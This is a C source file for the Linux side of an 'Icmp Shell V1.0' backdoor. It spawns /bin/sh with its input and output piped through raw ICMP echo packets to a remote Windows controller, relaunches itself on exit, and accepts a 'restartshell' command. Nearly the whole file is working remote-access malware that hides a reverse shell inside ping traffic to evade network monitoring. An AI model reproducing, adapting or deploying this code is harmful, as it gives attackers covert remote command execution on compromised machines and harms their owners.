/*
运行在 Linux 上的服务端

来一个

icmp 的一个 replay 包 和 一个 request 包要对应...

被控制的 linux 要发送 echo  request 包
然后 windows 这边需要关闭本机的 icmp echo 的功能 不响应 request 请求  然后我们的程序来发送 echo 请求

linux 需要先发一个包 过来 开始 shell --> 解决方案就是 不断的监听 监听到一个 icmp request 就向那个 ip 发送 icmp request 开始 shell
然后 windows 的控制端

Linux 上面启动一个定时器 1s 发送一个 request 请求 看看是不是有数据了

linux 发送数据给 windows 只能通过 request 包
windows 发送数据给 Linux 只能通过 reply 包     因为我们不能给对方发送 request 包

linux --zip--> windows
|               |
|               |
+--zip--0x842B--+

2013.4.27
todo:
    spilt lage data into mutil packet
    when sh exit  restart shell
*/
#include "icmp_shell.h"
#include "buffer.h"

typedef unsigned int uint32;
typedef unsigned short uint16;
typedef unsigned char uint8;

#define dbg_msg(fmt,...) do{\
        printf(fmt,__VA_ARGS__); \
    }while(0);

//#define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小
#define MAX_BUFF_SIZE  1000 // max data size can send 
#define SLEEP_TIME 1000 // interval of send echo request packet 


enum PACKET_TYPE
{
    TYPE_REQUEST = 0x2B,
    TYPE_REPLY
};


struct packet_header
{
    uint8 type;
};

int  g_icmp_sock = 0;
int  g_CanThreadExit = 0; //线程是不是可以退出了。
int  read_pipe[2];  //读取的管道
int  write_pipe[2];
char *g_MyName = NULL;
uint32 g_RemoteIp = 0;// 远程 ip
char *g_Cmd = NULL; //要执行的命令
char *g_Request = NULL;//请求的数据吧
char *g_password = "sincoder"; //通信的密码
int  g_child_pid = 0;// pid of sh
char *g_hello_msg = "\x2BIcmp Shell V1.0 \n\
By: sincoder \n\
command:\n\
\trestartshell\n";
uint32 g_bind_ip = 0;
//char g_output_buffer[MAX_BUFF_SIZE] = {0};  //缓存要发送的数据
pthread_mutex_t g_output_mutex;
buffer_context g_output_buffer = {0};

void icmp_append_send_buffer(char *data, int size);

void MySleep(uint32 msec)
{
    struct timespec slptm;
    slptm.tv_sec = msec / 1000;
    slptm.tv_nsec = 1000 * 1000 * (msec - (msec / 1000) * 1000);      //1000 ns = 1 us
    if (nanosleep(&slptm, NULL) != -1)
    {

    }
    else
    {
        dbg_msg("%s : %u", "nanosleep failed !!\n", msec);
    }
}

/*
from tcpdump  not thread safe
*/
#define IPTOSBUFFERS    12

char *iptos(uint32 in)
{
    static char output[IPTOSBUFFERS][3 * 4 + 3 + 1];
    static short which;
    unsigned char *p;

    p = (unsigned char *)&in;
    which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
    snprintf(output[which], sizeof(output[which]), "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

/*
创建一个线程
*/
pthread_t MyCreateThread(void * (*func)(void *), void *lparam)
{
    pthread_attr_t attr;
    pthread_t  p;
    pthread_attr_init(&attr);
    //pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
    if (0 == pthread_create(&p, &attr, func, lparam))
    {
        pthread_attr_destroy(&attr);
        return p;
    }
    dbg_msg("pthread_create() error: %s \n", strerror(errno));
    pthread_attr_destroy(&attr);
    return 0;
}

/*
计算 icmp 数据包的 校验和
*/
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    unsigned long sum;
    unsigned short oddbyte, rs;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    rs = ~sum;
    return rs;
}

uint16  random16()
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (uint16)tv.tv_sec * tv.tv_usec;
}

/*
发送 icmp  echo request 包
失败返回 -1
成功返回 0
*/
int  icmp_sendrequest(int icmp_sock, uint32 ip, uint8 *pdata, uint32 size)
{
    struct icmphdr *icmp;
    struct sockaddr_in addr;
    int nbytes;
    int ret = 1;

    dbg_msg("%s: try send request to %s \n", __func__, iptos(ip));

    icmp = (struct icmphdr *)malloc(sizeof(struct icmphdr) + size);
    if (NULL == icmp)
    {
        return -1;
    }
    icmp->type = 8;  // icmp  request
    icmp->code = 0;
    icmp->un.echo.id = random16();
    icmp->un.echo.sequence = random16();

    memcpy(icmp + 1, pdata, size);
    memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;

    icmp->checksum = 0x00;
    icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + size);

    // send reply
    nbytes = sendto(icmp_sock, icmp, sizeof(struct icmphdr) + size, 0, (struct sockaddr *) &addr, sizeof(addr));
    if (nbytes == -1)
    {
        perror("sendto");
        ret = -1;
    }
    free(icmp);
    return ret;
}

/*
发送 数据 对 数据进行 压缩
*/
int SendData(unsigned char *pData, int Size)
{
    return icmp_sendrequest(g_icmp_sock, g_RemoteIp, pData, Size);
}

void set_fd_noblock(int fd)
{
    int flags;
    flags = fcntl(fd, F_GETFL, 0);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

void  icmpshell_sendrequest(uint32 ip)
{
    int len = 0;
    char buff[513];
    buff[0] = TYPE_REQUEST;
    pthread_mutex_lock(&g_output_mutex);
    len = buffer_read(&g_output_buffer, &buff[1], 512);
    icmp_sendrequest(g_icmp_sock, ip, &buff[0], len + 1);
    pthread_mutex_unlock(&g_output_mutex);
}


int is_visual_char(unsigned char ch)
{
    switch (ch)
    {
    case 'A':
    case 'B':
    case 'C':
    case 'D':
    case 'E':
    case 'F':
    case 'G':
    case 'H':
    case 'I':
    case 'J':
    case 'K':
    case 'L':
    case 'M':
    case 'N':
    case 'O':
    case 'P':
    case 'Q':
    case 'R':
    case 'S':
    case 'T':
    case 'U':
    case 'V':
    case 'W':
    case 'X':
    case 'Y':
    case 'Z':
    case 'a':
    case 'b':
    case 'c':
    case 'd':
    case 'e':
    case 'f':
    case 'g':
    case 'h':
    case 'i':
    case 'j':
    case 'k':
    case 'l':
    case 'm':
    case 'n':
    case 'o':
    case 'p':
    case 'q':
    case 'r':
    case 's':
    case 't':
    case 'u':
    case 'v':
    case 'w':
    case 'x':
    case 'y':
    case 'z':
    case '~':
    case '!':
    case '@':
    case '#':
    case '$':
    case '%':
    case '^':
    case '&':
    case '*':
    case '(':
    case ')':
    case '_':
    case '+':
    case '`':
    case '1':
    case '2':
    case '3':
    case '4':
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
    case '0':
    case '-':
    case '=':
    case '{':
    case '}':
    case '[':
    case ']':
    case ':':
    case '"':
    case '|':
    case ';':
    case '\'':
    case '\\':
    case '<':
    case ',':
    case '>':
    case '.':
    case '?':
    case '/':
    case ' ':
    {
        return 1;
    }
    default:
        break;
    }
    return 0;
}

int icmpshell_process_command(char *cmd)
{
    char *ch = cmd;
    int len = 0;
    while (1)
    {
        ++len;
        if (0 == is_visual_char(*ch))
        {
            *ch = '\n';
            break;
        }
        ++ch;
    }
    //if(len < 1) // empty command 
    //    return 1;
    dbg_msg("%s: cmd: %s ",__func__,cmd);
    if (0 == strncasecmp(cmd, "restartshell", len))
    {
        dbg_msg("%s : try kill shell ! \n",__func__);
        // restart me
        if (-1 == kill(g_child_pid, 9))
        {
            // failed kill
            char *err_msg = "\nfailed to kill shell \n";
            icmp_append_send_buffer(err_msg,strlen(err_msg));
        }
    }
    else if (-1 == write(write_pipe[1], cmd, len ))
    {
        dbg_msg("%s:write failed !! \n", __func__);
        return 0;
    }
    return 1;
}

/*
接收命令的线程
*/
void *Icmp_RecvThread(void *lparam)
{
    char in_buf[8192];
    struct iphdr *ip;
    struct icmphdr *icmp;
    int nbytes = 0;

    dbg_msg("%s:Icmp_RecvThread  start !! \n", __func__);

    while (1)
    {
        // read data from socket
        memset(in_buf, 0x00, 8192);
        nbytes = read(g_icmp_sock, in_buf, 8192 - 1);
        if (nbytes > 0)
        {
            // get ip and icmp header and data part
            ip = (struct iphdr *) in_buf;
            dbg_msg("%s: recv a icmp packet from %s \n", __func__, iptos(ip->saddr));
            if (nbytes > sizeof(struct iphdr) && ip->saddr !=  inet_addr("127.0.0.1"))  //过滤掉本地 ip 的
            {
                int iplen = ip->ihl * sizeof(unsigned int);
                nbytes -= iplen;
                icmp = (struct icmphdr *) ((char *)ip + iplen);

                if (nbytes > sizeof(struct icmphdr))
                {
                    if (0 == icmp->code) //  icmp echo msg
                    {
                        if (0 == icmp->type) //replay
                        {
                            struct packet_header *phdr = (struct packet_header *)(icmp + 1);
                            nbytes -= sizeof(struct icmphdr);
                            nbytes -= sizeof(struct packet_header);
                            //data = (char *) (icmp + 1);  //得到 icmp 头 后面的数据
                            switch (phdr->type)
                            {
                            case TYPE_REPLY:  // we only handle this msg
                            {
                                char request_buff[sizeof(struct packet_header) + sizeof(g_output_buffer)];
                                char *data = (char *)(phdr + 1);

                                dbg_msg("%s: msg type reply !! \n", __func__);
                                dbg_msg("%s : recv %d bytes : %s \n", __func__, nbytes, data);
                                if (nbytes >= 0)
                                {
                                    data[nbytes] = '\0';
                                    if (icmpshell_process_command(data))
                                    {
                                        //我们也要马上 发回一个 request 来看看 有木有数据了 此时要延时的
                                        MySleep(SLEEP_TIME);
                                        icmpshell_sendrequest(ip->saddr);
                                    }
                                }
                            }
                            break;
                            case TYPE_REQUEST:
                            {
                                dbg_msg("%s:msg type request  error packet !!!!\n", __func__);
                            }
                            break;
                            default:
                            {
                                dbg_msg("%s : unknown msg !!! something may goes wrong \n", __func__);
                            }
                            break;
                            }

                        }

                        else if (8 == icmp->type)
                        {
                            char *data = (char *)(icmp + 1);
                            if (TYPE_REQUEST == data[0])
                            {
                                dbg_msg("%s: recv a icmp request from %s \n", __func__, iptos(ip->saddr));

                                icmp_sendrequest(g_icmp_sock, ip->saddr, (uint8 *)g_hello_msg, strlen(g_hello_msg)); //
                            }
                        }
                    }
                }
            }
        }
        if (-1 == nbytes)
        {
            dbg_msg("%s:read() error \n", __func__);
            perror("read() :");
            break;
        }
    }
    dbg_msg("%s: Thread exit ... \n", __func__);
    return NULL;
}

void icmp_append_send_buffer(char *data, int size)
{
    //把读到的数据放到全局的缓冲区中
    pthread_mutex_lock(&g_output_mutex);
    buffer_write(&g_output_buffer, data, size);
    pthread_mutex_unlock(&g_output_mutex);
}

/*
从管道中读取数据（命令执行的结果）并发送出去
*/
static void *ShellPipe_ReadThread(void *lparam)
{
    unsigned char buff[1024];
    int nBytes = 0;

    dbg_msg("%s:ShellPipe_ReadThread  start ...\n", __func__);
    while ((nBytes = read(read_pipe[0], &buff[0], 1000)) > 0)
    {
        buff[nBytes] = 0;
        dbg_msg("%s: recv %d bytes from pipe: %s \n", __func__, nBytes, buff);
        icmp_append_send_buffer( &buff[0], nBytes);
    }
    dbg_msg("%s: thread exit ... \n", __func__);
    return NULL;
}

// void *Timer_thread(void *lparam)
// {
//     while (MySleep(SLEEP_TIME))
//     {
//         icmp_sendrequest(g_icmp_sock,)
//     }
// }


/*
退出的时候重新启动进程
*/
static void OnExit()
{
    dbg_msg("%s:exiting 。。、\n", __func__);
    dbg_msg("%s : try restart shell  !! \n", __func__);
    sleep(1);
    if (g_MyName)
        system(g_MyName); //重新启动进程
    else
        dbg_msg("%s:xxxxxx \n", __func__);
}

static uint32_t get_local_ip (uint32_t ip)
{
    char buffer[100];
    int sock = socket ( AF_INET, SOCK_DGRAM, 0);
    int dns_port = 53;
    int err;
    struct sockaddr_in serv;
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    //msg("%s:%s  \n",__func__,inet_ntoa(*(struct in_addr *)&ip));
    memset( &serv, 0, sizeof(serv));
    memset( &name, 0, sizeof(name));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = ip;//inet_addr(HostName);
    //memcpy(&serv.sin_addr.s_addr,&ip,4);
    serv.sin_port = htons( dns_port );
    err = connect( sock , (const struct sockaddr *) &serv , sizeof(serv) );
    err = getsockname(sock, (struct sockaddr *) &name, &namelen);
    //const char *p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);
    if (-1 == err)
    {
        dbg_msg("%s:%s", __func__, "getsockname failed\n");
    }
    close(sock);
    return name.sin_addr.s_addr;
}


int main(int argc, char **argv)
{
    int pid;
    g_MyName = argv[0]; //保存下
    atexit(OnExit);
    // create raw ICMP socket
    g_icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (g_icmp_sock == -1)
    {
        perror("socket");
        return -1;
    }

    //bind(g_icmp_sock,)
    //要 不用 Bind 一个本地的ip 只接收来自远程的 包

    pipe(read_pipe);
    pipe(write_pipe);

    g_child_pid = fork();

    if (0 == g_child_pid)
    {
        //进入子进程
        //启动 shell 进程
        close(g_icmp_sock); // child do not need
        close(read_pipe[0]);
        close(write_pipe[1]);
        char *argv[] = {"/bin/sh", NULL};
        char *shell = "/bin/sh";
        dup2(write_pipe[0], STDIN_FILENO); //将输入输出重定向到管道
        dup2(read_pipe[1], STDOUT_FILENO);
        dup2(read_pipe[1], STDERR_FILENO);
        execv(shell, argv); //启动 shell
    }
    else
    {
        pthread_t hIcmpRecv;
        pthread_t hShellRead;
        close(read_pipe[1]);
        close(write_pipe[0]);
        buffer_init(&g_output_buffer);
        dbg_msg("child process id %d \n", g_child_pid);
        pthread_mutex_init(&g_output_mutex, NULL);
        //启动一个线程来读取
        hIcmpRecv = MyCreateThread(Icmp_RecvThread, NULL);
        hShellRead = MyCreateThread(ShellPipe_ReadThread, NULL);
        if (0 == hIcmpRecv || 0 == hShellRead)
        {
            dbg_msg("%s:Create Thread exit ... \n", __func__);
        }
        waitpid(g_child_pid, NULL, 0); //等待子进程退出
        dbg_msg("%s:child exit. ..\n", __func__);
        //write(g_icmp_sock,"sincoder",8);
        icmp_sendrequest(g_icmp_sock, inet_addr("127.0.0.1"), "sincoder", 8);
        close(g_icmp_sock); //tell the icmp_recv thread exit ...
        close(read_pipe[0]);
        close(write_pipe[1]);
        dbg_msg("%s:wait thread exit ...\n", __func__);
        pthread_join(hIcmpRecv, NULL); //线程会因为上面的句柄关闭 而退出
        pthread_join(hShellRead, NULL);
        buffer_free(&g_output_buffer);
    }
    return 0;
}
